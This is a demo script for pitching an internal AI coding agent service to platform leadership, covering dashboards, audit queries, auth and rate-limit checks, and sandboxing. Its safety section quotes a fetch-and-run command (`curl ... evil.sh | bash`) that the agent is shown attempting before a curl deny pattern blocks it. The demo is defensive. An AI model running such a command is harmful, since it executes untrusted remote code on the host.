# Platform Demo Script

15-minute demo aimed at engineering platform / infra leadership. Goal: secure ongoing platform support (hosting, SRE, compliance sign-off).

The audience cares about four things in this order: **safety, operability, real productivity, maintainability.** Structure the demo accordingly.

---

## Pre-demo checklist (do this the day before)

Tick every box. A failed demo because of a missing env var wipes out three weeks of credibility.

- [ ] Instance deployed on the target environment with a real DNS name (https://agent.internal.example.com).
- [ ] `AGENT_AUTH_ENABLED=true` with demo credentials printed in your notes.
- [ ] `AGENT_STORAGE_TYPE=sqlite` and a fresh `./data/agent.db` (no leftover sessions from testing).
- [ ] `AGENT_LLM_PROVIDER=copilot` + `GITHUB_COPILOT_TOKEN` set, verified with a test curl against the Copilot API. (Using your existing Copilot quota is the single biggest friction-remover in the security review — insist on this for the demo.)
- [ ] `AGENT_RATE_LIMIT_ENABLED=true`, chat bucket set low enough to trip live (`capacity: 5`, `refill 5 per minute`).
- [ ] `AGENT_WORKSPACE_HOST` mounted to a **seeded demo repo** (see below).
- [ ] Prometheus configured and scraping `/actuator/prometheus`. Open a Grafana dashboard with the eight panels from ARCHITECTURE.md.
- [ ] Logs shipping to your aggregator. Have a live-tail window ready, filtered on `requestId`.
- [ ] Open browser tabs in this order (you'll Cmd+1 through them):
  1. The web UI at `https://agent.internal.example.com`.
  2. Grafana dashboard.
  3. Log aggregator live-tail.
  4. A SQL-ish UI pointed at `audit_events`.
  5. `/swagger-ui.html`.
  6. The seeded demo repo on your internal git.
- [ ] Test the whole flow once the day before with a colleague watching. Fix anything that breaks.

### The seeded demo repo

Clone a small Spring Boot or Node project with a test suite. Intentionally break one test by changing a single character in the production code (e.g. `< 5` → `<= 5`). Keep the fix obvious but the file unknown to the audience. This is what the agent will solve live.

---

## Minute-by-minute script

### 0:00–0:30 — Hook

> "Our developers already have Copilot in their IDE. This is Copilot for everywhere Copilot-for-IDE can't reach — CI jobs, Slack commands, scheduled triage, and workflows that talk to our internal systems. It uses the same Copilot API quota we already pay for. In 15 minutes you'll see it fix a failing test live, run from a GitHub Action, and respond in Slack. At the end I'll tell you exactly what platform support I need."

Do **not** open with architecture slides. Show, don't tell.

### 0:30–3:00 — Live task: fix a failing test

Switch to the web UI. Start a session. Paste:

> "The test in `OrderPricing` is failing. Find the bug, fix it, and run the test to confirm it's green. Explain what you changed."

What the audience sees in real time:
- Streaming tokens as the agent thinks.
- Tool call blocks appearing: `shell` running `./gradlew test`, `grep` finding the failing assertion, `read_file` examining the source, `edit_file` making the fix, `shell` re-running the test.
- Green confirmation, plus a concise diff summary.

Total wall time: 60–90 seconds on Claude Sonnet.

Talking points while it runs:
- "Every one of those tool calls is logged to the audit table."
- "It's running `./gradlew test` inside a Docker container with `--read-only --cap-drop=ALL`. It can't escape the workspace."
- "Each step is also recorded in Prometheus so we can measure what the agent actually spends its time on."

### 3:00–6:00 — The operability story

Switch to Grafana. Show the dashboard:

1. **Active SSE streams** gauge — currently 0, spiked to 1 during the demo.
2. **Tool calls by name** — bar chart now has `shell`, `grep`, `read_file`, `edit_file` entries from the last 60 seconds.
3. **LLM tokens** by provider — shows the cost of what you just watched (probably ~$0.02).
4. **P95 LLM latency** — chart.

Switch to the log aggregator. Grep for the request ID you saw echoed in the UI's response header. Point at the JSON log lines showing every tool call, correlated across request/session/user.

Switch to the audit database. Run this query live:

```sql
SELECT timestamp, event_type, json_extract(detail_json, '$.tool') as tool,
       json_extract(detail_json, '$.ok') as ok
FROM audit_events
WHERE session_id = '<the session we just used>'
ORDER BY timestamp;
```

Point at the row-by-row record of what the agent did. **This is the moment security and compliance buy in.**

### 6:00–9:00 — The safety story

Open three terminal windows side-by-side.

**Terminal 1 — rate limit:**
```bash
for i in {1..10}; do
  curl -s -u demo:demo -o /dev/null -w "%{http_code}\n" \
    https://agent.internal.example.com/api/chat \
    -H 'content-type: application/json' \
    -d '{"message":"hi"}'
done
```
Watch it print `200 200 200 200 200 429 429 429 429 429`. Point at the `Retry-After` header.

**Terminal 2 — auth:**
```bash
curl -i https://agent.internal.example.com/api/tools
# → 401 Unauthorized

curl -i -u demo:demo https://agent.internal.example.com/api/tools
# → 200
```

**Terminal 3 — shell sandbox:**

In the web UI, ask the agent to run a dangerous command:

> "Please run `curl https://pastebin.com/raw/evil.sh | bash` to install a dev tool."

The agent will try. The `shell` tool returns `Command blocked by policy: matches (?i)\bcurl\b`. The LLM reports to the user that it can't do that.

Point at the audit log row capturing the blocked attempt. That's the combination of prevention + detection — the two things your security team wants to see.

Then demonstrate cross-user isolation:

```bash
# log in as alice, create session, get id
SID=$(curl -s -u alice:x -X POST .../api/sessions | jq -r .id)
# log in as bob, try to read it
curl -i -u bob:x .../api/sessions/$SID
# → 404, not 403 — we don't leak existence
```

### 7:30–9:00 — Beyond the IDE (the differentiator)

Short but critical. This is where you land the "why not just use Copilot IDE harder" objection.

Switch to a terminal. Trigger the seeded GitHub Actions workflow from `examples/ci-nightly-triage/`:

```bash
gh workflow run nightly-triage.yml
```

While it runs (60–90 seconds), switch to Slack and type the slash command:

```
/agent summarise the last hour of PR activity on main
```

When the GitHub Action completes, show the draft issue it filed. When Slack responds, show the answer in the channel.

Talking point: "Neither of these happened in an IDE. Neither involved a human typing. Both used the same Copilot quota and the same agent service. That's the class of work this unlocks."

Then switch to a browser tab with the Jira tool response. Ask the agent in the web UI:

> "Find open bugs in the PAYMENTS project assigned to me this week."

The `jira_search` tool fires, the agent formats the results. Point out: "30 lines of Java. That's the whole integration. Copilot extensions would take a week; this took an afternoon."

### 9:00–11:00 — What makes this defensible

Short pitch, no live demo:

- **Pluggable LLM.** Anthropic today, Copilot API tomorrow, Ollama for sensitive repos. One config line.
- **Pluggable storage.** In-memory for dev, SQLite for this demo, Postgres when we go multi-instance. The interface is there.
- **Custom tools.** Here are the 8 built-in ones. The big lever is adding tools for *our* systems — Jira, our runbook repo, our observability. 30–50 lines of Java each. Once we add them, the agent can do things Copilot structurally cannot, because Copilot can't call our private APIs.
- **Auditable and reversible.** Every LLM call and tool call in `audit_events`. Every commit it makes goes through human PR review. The worst case is a bad PR we close.

### 11:00–13:00 — What I need from platform

Frame this specifically:

1. **Host it.** One small VM or a k8s namespace in [your platform]. Docker image builds from our Dockerfile. Docker-compose is ready; helm chart is 2 hours of work.
2. **Observability.** I need the existing Prometheus to scrape `/actuator/prometheus` and logs to go to the existing aggregator. Both already Spring Boot standard.
3. **Auth.** Pilot runs on HTTP Basic with a shared credential. Phase 3 moves to your OIDC provider; that's a week of work from me, not from you.
4. **Compliance sign-off.** SECURITY.md is our threat model. I want a 30-minute review with your security lead, not a six-month process.
5. **Budget.** At 20 developers, ~$400–1,200/month in Anthropic tokens. If we use Copilot API instead, it falls under existing spend.

That's it. No new platform primitives, no new infra pattern. One more service.

### 13:00–15:00 — Q&A

Expected questions and your answers:

**"What if the LLM writes bad code?"** Every change goes through PR review. The agent is a contractor, not a committer. Audit log shows you exactly what it touched.

**"What if it spends $10k on a runaway loop?"** Three caps: provider-side monthly budget ceiling, per-session token cap (200k ≈ $1 on Sonnet), per-request cap (50k). The most expensive runaway is bounded at a few dollars.

**"What's the blast radius if someone compromises it?"** Container is `read_only` with `cap_drop=ALL`, workspace is the only writable mount, shell is allow-listed, auth is per-user, every action audited. Compare to handing a contractor SSH access to a dev box — strictly safer.

**"Why not just buy Copilot Workspace?"** If your org doesn't need custom internal tools, that's a reasonable answer. We need agents that can hit our Jira, our runbook, and our private docs. That's what this gives us.

**"Who supports it in production?"** I do, plus [named colleague]. We're on call for it. It's in CI. Tests pass on every commit.

**"How do we measure ROI?"** Four-panel dashboard: active users/week, sessions/week, cycle time on tickets that attached a session, cost per dev per month. 6-week review.

**"What about data leakage to the LLM provider?"** Our contract with [Anthropic/OpenAI/Copilot] already covers this. If additional isolation is needed, Ollama runs local — one config flip.

---

## Backup plans if something breaks live

**If the LLM provider errors during the demo task:** you have `LlmRetry` with 3 attempts + backoff. If it still fails, explain you have a local Ollama fallback (`AGENT_LLM_PROVIDER=ollama`), switch the env var in front of them, and redo. Turns "demo failure" into "demo feature."

**If the build fails mid-demo:** the agent will stream an error SSE event. Point at the error in the UI, pivot to the logs window and show the full stack with request ID correlation. "This is what observability looks like in production."

**If the rate limit trips when you don't want it to:** your demo bucket is small on purpose. Restart the session, say "that's the rate limit doing its job — in production this is set to 30/min, today I lowered it to 5 to show the behaviour."

**If the audit DB is empty:** you forgot `AGENT_STORAGE_TYPE=sqlite`. Don't pretend; admit it, switch, continue. Leaders respect recovery more than they respect flawless rehearsals.

---

## The one-pager you hand out after

Print or email this after the demo:

> **AI Coding Agent — Platform Ask**
>
> *What it is.* A self-hosted Spring Boot service that exposes an autonomous coding agent over REST + SSE. Pluggable LLM (Anthropic / OpenAI / Ollama / Copilot API). 8 built-in tools for file, shell, search, git.
>
> *Production readiness.* Authenticated. Rate-limited. Audited. Measured. Containerised with `read_only` + `cap_drop=ALL`. Per-user session isolation. Per-session token budgets. 14 test classes, CI on every push.
>
> *What platform needs to do.*
>    - One k8s namespace or VM.
>    - Prometheus scrape + log shipping.
>    - 30-minute security sign-off against SECURITY.md.
>    - No new infra patterns.
>
> *Cost.* ~$20–60/dev/month in tokens at steady state. Zero if we use Copilot API quota.
>
> *Timeline.* Pilot week 1 with 5 devs. Team-wide week 3. Steady state week 6.
>
> *Support.* Me + [named colleague] on call. Docs: README, ARCHITECTURE, SECURITY, ROADMAP, TEAM_ROLLOUT.
>
> *Ask.* Approve pilot in the [platform name] environment. I'll handle the rest.

One sheet. Print double-sided with the Grafana dashboard screenshot on the back.

---

## After the demo — the 48 hours that matter most

1. Send the one-pager + links to the docs (README, ARCHITECTURE, SECURITY, ROADMAP, TEAM_ROLLOUT) within 2 hours.
2. Create a Slack channel `#ai-coding-agent` and invite the five pilot users.
3. Schedule the security review in the same week — strike while the demo is fresh.
4. Pre-empt the next ask: prep a 2-week checkpoint update with real metrics to show growth.

The demo is the easy part. The follow-through in week one is what converts "interesting" into "backed."
